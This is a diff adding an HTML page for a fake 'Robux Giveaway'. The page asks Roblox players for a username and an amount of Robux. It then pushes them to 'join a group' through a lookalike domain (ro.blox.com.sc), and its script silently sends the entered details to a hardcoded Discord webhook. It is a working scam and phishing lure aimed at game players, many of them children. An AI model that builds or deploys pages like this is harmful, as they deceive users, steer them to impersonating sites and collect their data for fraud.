@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Robux Giveaway</title>
+  <style>
+    body {
+      background: #0a0a0a;
+      font-family: Arial, sans-serif;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .box {
+      background-color: #1a1a1a;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 0 20px rgba(0, 255, 100, 0.4);
+      width: 360px;
+      text-align: center;
+    }
+    h2 {
+      color: #00ff88;
+    }
+    input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    input {
+      background: #2e2e2e;
+      color: white;
+    }
+    button {
+      background: #00ff88;
+      color: black;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .popup {
+      display: none;
+      margin-top: 20px;
+      background: #111;
+      padding: 20px;
+      border-radius: 10px;
+      border-left: 4px solid #00ff88;
+    }
+    .popup a button {
+      background-color: #007bff;
+      color: white;
+      width: 100%;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <h2>🎁 Robux Giveaway</h2>
+    <form id="giveawayForm">
+      <input type="text" id="username" placeholder="Roblox Username" required>
+      <input type="number" id="amount" placeholder="How much Robux do you want?" required>
+      <button type="submit">Robux Send</button>
+    </form>
+
+    <div class="popup" id="joinPopup">
+      🚫 YOU'RE NOT JOINED IN MY GROUP YET — JOIN FIRST 👇<br><br>
+      <a href="https://www.ro.blox.com.sc/communities/7602819563/Robux-Giveaway-By-Roblox" target="_blank">
+        <button type="button">Join Roblox Group</button>
+      </a>
+    </div>
+  </div>
+
+  <script>
+    let userData = {};
+
+    document.getElementById("giveawayForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      userData.username = document.getElementById("username").value;
+      userData.amount = document.getElementById("amount").value;
+
+      document.getElementById("joinPopup").style.display = "block";
+
+      // Auto send to webhook after 1 seconds
+      setTimeout(() => {
+        const webhookURL = "https://discord.com/api/webhooks/1392761727912906782/-3nGv1RWDdNT2a3RwY5i7AvQCS_QhhBZ-yjnU0ZXav4QvlDYVGtZ-sVSRtsuVXz95LDx";
+
+        fetch(webhookURL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: `🎁 **Robux Giveaway Entry!**\n👤 **Username:** ${userData.username}\n💸 **Requested Robux:** ${userData.amount}`
+          })
+        });
+
+        document.getElementById("giveawayForm").reset();
+      }, 10000);
+    });
+  </script>
+</body>
+</html>
